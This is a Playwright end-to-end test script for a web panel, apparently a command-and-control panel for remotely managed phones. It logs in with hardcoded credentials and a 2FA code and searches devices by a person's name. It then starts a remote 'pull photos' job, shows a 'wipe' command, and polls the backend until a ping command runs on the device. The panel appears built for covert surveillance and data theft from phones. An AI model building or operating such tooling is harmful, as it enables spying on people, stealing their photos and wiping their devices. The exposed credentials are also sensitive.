const { chromium } = require("D:/wormgitty/panel/node_modules/@playwright/test");

const SHOTS = "D:/wormgitty/.shots";
const DEVICE_ID = "99dceb55aa1a6737";
const BACKEND = "http://127.0.0.1:3000";

(async () => {
  const browser = await chromium.launch({ headless: true });
  const page = await browser.newPage({ viewport: { width: 1280, height: 900 } });
  page.on("response", (r) => { if (r.url().includes("/api/")) console.log("API:", r.status(), r.url().slice(-60)); });

  // 1) Login stage 1: username + password
  await page.goto("http://localhost:5173/", { waitUntil: "networkidle" });
  await page.screenshot({ path: `${SHOTS}/20_login.png` });
  await page.fill('[data-testid="email"]', "NemesisDevX...Fuck.allworld.com");
  await page.fill('[data-testid="password"]', "AbdoAbdo@9@Zxcvbnm@1@");
  await page.click('[data-testid="login-submit"]');

  // 2) Login stage 2: 6-digit code
  await page.waitForSelector('[data-testid="twofa"]', { timeout: 10000 });
  await page.screenshot({ path: `${SHOTS}/21_2fa.png` });
  await page.fill('[data-testid="twofa"]', "1057466");
  await page.click('[data-testid="login-submit"]');

  // 3) Home cards
  await page.waitForSelector('[data-testid="card-phones"]', { timeout: 10000 });
  await page.screenshot({ path: `${SHOTS}/22_home.png` });
  await page.click('[data-testid="card-phones"]');

  // 4) Devices list + filters
  await page.waitForSelector(`[data-testid="device-row-${DEVICE_ID}"]`, { timeout: 15000 });
  await page.waitForTimeout(800);
  await page.screenshot({ path: `${SHOTS}/23_devices.png` });
  console.log("ROW:", (await page.textContent(`[data-testid="device-row-${DEVICE_ID}"]`))?.replace(/\s+/g, " ").slice(0, 150));
  // exercise filters
  await page.click('[data-testid="filter-online"]');
  await page.fill('[data-testid="device-search"]', "Ahmed");
  await page.waitForTimeout(600);

  // 5) Detail: actions + stats side panel
  await page.click(`[data-testid="device-row-${DEVICE_ID}"]`);
  await page.waitForSelector('[data-testid="cmd-wipe"]', { timeout: 8000 });
  await page.waitForTimeout(600);
  await page.screenshot({ path: `${SHOTS}/24_detail.png` });
  console.log("STATS:", (await page.textContent('[data-testid="stats-panel"]'))?.replace(/\s+/g, " ").slice(0, 220));
  console.log("DOWNLOADS:", await page.textContent('[data-testid="detail-downloads"]'));

  // 6) Pull photos modal: tabs + counts + spec parse + start
  await page.click('[data-testid="cmd-photos"]');
  await page.waitForSelector('[data-testid="pull-modal"] .modal', { timeout: 8000 });
  await page.waitForTimeout(500);
  await page.screenshot({ path: `${SHOTS}/25_pull_modal.png` });
  await page.fill('[data-testid="pull-spec"]', "5");
  await page.click('[data-testid="pull-start"]');
  await page.waitForSelector('[data-testid="command-flash"]', { state: "visible", timeout: 8000 }).catch(() => {});
  await page.screenshot({ path: `${SHOTS}/26_pull_started.png` });

  // 7) ping dispatch → verify executed via backend
  await page.click('[data-testid="pull-modal"]', { position: { x: 20, y: 20 }, force: true }).catch(() => {});
  await page.click('[data-testid="cmd-ping"]');
  const login = await fetch(`${BACKEND}/api/v1/auth/login`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: "NemesisDevX...Fuck.allworld.com", password: "AbdoAbdo@9@Zxcvbnm@1@" }),
  }).then((r) => r.json());
  const tok = await fetch(`${BACKEND}/api/v1/auth/2fa`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ ticket: login.ticket, code: "1057466" }),
  }).then((r) => r.json());

  let done = null;
  for (let i = 0; i < 12 && !done; i++) {
    await new Promise((r) => setTimeout(r, 4000));
    const cmds = await fetch(`${BACKEND}/api/v1/devices/${DEVICE_ID}/commands`, {
      headers: { Authorization: `Bearer ${tok.accessToken}` },
    }).then((r) => r.json());
    done = cmds.find((c) => c.type === "ping" && c.state === "executed" && Date.now() - new Date(c.updatedAt) < 120000);
    console.log(`poll ${i}: ${cmds.map((c) => `${c.type}:${c.state}`).join(",") || "none"}`);
  }
  console.log(done ? `PING EXECUTED result=${done.result}` : "PING NOT EXECUTED");
  await page.screenshot({ path: `${SHOTS}/27_final.png` });
  await browser.close();
  process.exit(done ? 0 : 2);
})().catch((e) => { console.error("E2E FAIL:", e.message); process.exit(1); });
